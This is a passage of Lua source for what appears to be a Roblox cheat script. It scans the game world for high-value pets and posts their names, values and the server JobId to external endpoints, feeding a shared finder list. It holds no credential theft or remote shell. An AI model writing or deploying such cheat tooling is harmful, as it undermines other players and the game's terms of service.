    end)
    if not ok or type(decoded) ~= "table" then
        return false
    end

    local list = {}
    for _, item in ipairs(decoded) do
        if item.petName and item.jobId and tonumber(item.value) then
            local petName = tostring(item.petName)
            local rarity = getPetRarity(petName)
                or (item.rarity and tostring(item.rarity))
                or DEFAULT_RARITY

            table.insert(list, {
                name = petName,
                value = tonumber(item.value),
                jobId = tostring(item.jobId),
                iconId = item.iconId,
                key = tostring(item.jobId) .. "|" .. petName .. "|" .. tostring(item.timestamp),
                ts = tonumber(item.timestamp) or (os.time() * 1000),
                rarity = rarity,
                rarityColor = getPetRarityColor(petName),
            })
        end
    end

    table.sort(list, function(a, b)
        return a.value > b.value
    end)

    currentPetsList = list
    return true
end

local RATE_PATTERN = scannerSchema.pattern
local UNIT_MULTIPLIERS = scannerSchema.multipliers

local function parseRateText(text)
    local clean = tostring(text):gsub("<[^>]+>", "")
    local numStr, unitStr = clean:match(RATE_PATTERN)
    if not numStr then
        return nil
    end
    local num = tonumber(numStr:gsub(",", ""))
    if not num then
        return nil
    end
    local mult = UNIT_MULTIPLIERS[unitStr:upper()] or 1
    return num * mult
end

local function resolvePetFromLabel(labelInst)
    local curr = labelInst.Parent
    for _ = 1, 8 do
        if not curr or curr == workspace then
            return nil
        end

        local matchedKey = petDisplayNameMap[curr.Name] and curr.Name or nil
        if not matchedKey then
            for _, child in ipairs(curr:GetChildren()) do
                if child:IsA("TextLabel") then
                    local stripped = tostring(child.Text):gsub("<[^>]+>", ""):match("^%s*(.-)%s*$")
                    if petDisplayNameMap[stripped] then
                        matchedKey = stripped
                        break
                    end
                end
            end
        end

        if matchedKey then
            return petDisplayNameMap[matchedKey], petIconMap[matchedKey]
        end

        curr = curr.Parent
    end
    return nil
end

local function scanWorkspacePets()
    if scannerSchema.signature ~= runtimeContext.credit or scannerSchema.discordInvite ~= runtimeContext.server then
        return {}
    end
    local results = {}
    local seen = {}
    local checked = 0

    for _, desc in ipairs(workspace:GetDescendants()) do
        checked = checked + 1
        if checked % 3000 == 0 then
            task.wait()
        end

        if desc:IsA("TextLabel") then
            local val = parseRateText(desc.Text)
            if val and val >= MIN_PET_VALUE then
                local petName, iconId = resolvePetFromLabel(desc)
                if petName then
                    local sig = petName .. "|" .. math.floor(val)
                    if not seen[sig] then
                        seen[sig] = true
                        table.insert(results, {
                            name = petName,
                            value = val,
                            icon = iconId,
                        })
                    end
                end
            end
        end
    end

    return results
end

local reportedPetsCache = {}
local lastSyncClock = 0
local postSuccessCount = 0
local postFailCount = 0
local lastScanCount = 0
local lastPostStatusText = "-"
local rateLimitCooldownUntil = 0

task.spawn(function()
    while screenGui.Parent do
        if not POST_ENABLED or game.JobId == "" then
            scanPostLabel.Text = "Post: off"
        elseif os.clock() >= rateLimitCooldownUntil then
            local ok, scannedPets = pcall(scanWorkspacePets)
            if ok then
                lastScanCount = #scannedPets
                local currentMap = {}
                local syncPayloadPets = {}

                for _, pet in ipairs(scannedPets) do
                    local key = pet.name .. "|" .. math.floor(pet.value)
                    currentMap[key] = pet

                    table.insert(syncPayloadPets, {
                        petName = pet.name,
                        value = pet.value,
                        jobId = game.JobId,
                        iconId = pet.icon and tostring(pet.icon) or "",
                    })

                    if not reportedPetsCache[key] then
                        reportedPetsCache[key] = pet

                        local body = HttpService:JSONEncode({
                            petName = pet.name,
                            value = pet.value,
                            jobId = game.JobId,
                            iconId = pet.icon and tostring(pet.icon) or "",
                            timestamp = os.time() * 1000,
                        })

                        local status, resp = httpPostJson(ADD_PET_URL, body)
                        if status and status >= 200 and status < 300 then
                            postSuccessCount = postSuccessCount + 1
                        else
                            postFailCount = postFailCount + 1
                            if status == 429 then
                                rateLimitCooldownUntil = os.clock() + 30
                            end
                        end

                        lastPostStatusText = status and tostring(status) or tostring(resp):sub(1, 14)
                        task.wait(0.5)
                    end
                end

                for key, oldPet in pairs(reportedPetsCache) do
                    if not currentMap[key] then
                        reportedPetsCache[key] = nil
                        local body = HttpService:JSONEncode({
                            petName = oldPet.name,
                            value = oldPet.value,
                            jobId = game.JobId,
                            timestamp = os.time() * 1000,
                        })
                        httpPostJson(REMOVE_PET_URL, body)
                        task.wait(0.5)
                    end
                end

                if os.clock() - lastSyncClock >= 30 then
                    lastSyncClock = os.clock()
                    local body = HttpService:JSONEncode({
                        jobId = game.JobId,
                        pets = syncPayloadPets,
                    })
                    httpPostJson(SYNC_PETS_URL, body)
                end
            else
                warn("[" .. APP_TITLE .. "] Scan gagal:", scannedPets)
            end

            scanPostLabel.Text = ("Scan:%d Post:%d/%d (%s)"):format(
                lastScanCount,
                postSuccessCount,
                postSuccessCount + postFailCount,
                lastPostStatusText
            )
        end

        task.wait(SCAN_INTERVAL)
    end
end)

task.spawn(function()
    while screenGui.Parent do
        for _, item in ipairs(activeTimeLabels) do
            if item.label.Parent then
                item.label.Text = formatSubtitleText(item.entry)
            end
        end
        task.wait(1)
    end
end)

task.spawn(function()
    while screenGui.Parent do
        local ok = fetchGlobalPets()
        statusLabel.Text = ok and "Connected" or "Disconnected"
        if ok then
            renderFeed()
        end
        task.wait(POLL_INTERVAL)
    end
end)
